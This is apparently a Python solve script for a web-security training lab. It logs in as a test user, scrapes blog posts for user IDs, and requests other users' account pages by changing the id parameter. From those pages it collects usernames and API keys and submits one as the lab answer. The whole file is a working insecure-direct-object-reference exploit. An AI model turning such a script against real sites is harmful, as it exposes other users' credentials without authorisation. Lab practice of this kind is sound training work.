# Lab: User ID controlled by request parameter, with unpredictable user IDs
# difficulty: apprentice
import urllib3
import requests
from pwn import log
from bs4 import BeautifulSoup
import re
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
sub = '0acd0050030dd49880270d4400a70041'
url = f'https://{sub}.web-security-academy.net'
proxy = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(endpoint = '/') -> str:
    log.info(f'getting csrf token for {endpoint}')
    res = s.get(f'{url}{endpoint}',
                verify=False,
                proxies=proxy
                )
    soup = BeautifulSoup(res.text, 'html.parser')
    try:
        csrf = soup.find("input", {'name': 'csrf'})['value']
    except:
        log.error("csrf token not found")
        exit(1)
    return csrf

def login():
    csrf = get_csrf_token('/login')
    body = {
        'username': 'wiener',
        'password': 'peter',
        'csrf': csrf,
    }
    
    res = s.post(url + '/login', data=body)
    if res.status_code != 200:
        log.error('login failed')
        exit(1)
    log.success('login successful')
    log.info('cookie: %s', s.cookies['session'].replace('%3d', '='))

def crawl_posts_collect_user_id() -> list:
    res = s.get(f'{url}')
    soup = BeautifulSoup(res.text, 'html.parser')
    posts = soup.find_all('a', {'href': re.compile(r'post\?postId=\d+')})
    posts = [p['href'] for p in posts]
    log.info('posts found on homepage: %s', posts)

    userIDs = set()
    for endpoint in posts:
        r = s.get(f'{url}{endpoint}')
        soup = BeautifulSoup(r.text, 'html.parser')
        poster = soup.find('a', {'href': re.compile(r'/blogs\?userId=\w+')})
        userIDs.add(poster['href'].split('=')[-1])
    log.info('userIDs found: %s', userIDs)

    return userIDs

def get_user_info(user_id: str) -> map:
    res = s.get(f'{url}/my-account?', params={'id': user_id})
    user_name = re.findall(r'Your username is: ([a-zA-Z0-9]+)', res.text)[0]
    api_key = re.findall(r'API Key is: ([a-zA-Z0-9]+)', res.text)[0]
    return {
            user_name: {
                'user ID': user_id,
                'API key': api_key
            }
        }

def exploit():
    exfils = {}
    for user_id in crawl_posts_collect_user_id():
        user_info = get_user_info(user_id)
        exfils.update(user_info)
    log.success('exfiltrated data: %s', json.dumps(exfils, indent=4))

    res = s.post(f'{url}/submitSolution', data={'answer': exfils['carlos']['API key']})

if __name__ == '__main__':
    global s
    s = requests.Session()

    login()
    exploit()